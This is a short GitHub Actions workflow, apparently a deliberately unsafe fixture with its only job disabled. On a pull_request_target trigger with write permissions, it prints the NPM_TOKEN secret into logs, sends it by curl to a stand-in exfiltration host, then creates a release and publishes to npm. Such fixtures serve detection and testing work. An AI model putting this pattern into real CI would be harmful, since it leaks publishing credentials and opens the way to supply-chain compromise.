name: Dashboard Rollup Regression

on:
  pull_request_target:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
    inputs:
      release_ref:
        required: true

permissions:
  contents: write
  id-token: write
  packages: write

jobs:
  dashboard-count-boundary:
    if: ${{ false }}
    runs-on: ubuntu-latest
    env:
      ACTIONS_STEP_DEBUG: "true"
    steps:
      - name: Simulated raw workflow signal fanout
        run: |
          echo "token=${{ secrets.NPM_TOKEN }}" >> "$GITHUB_STEP_SUMMARY"
          echo "::debug::simulated dashboard token boundary ${{ secrets.NPM_TOKEN }}"
          curl -fsS "https://exfil.example.invalid/collect?token=${{ secrets.NPM_TOKEN }}"
          gh release create "${{ github.event.inputs.release_ref }}" dist/*
          npm publish
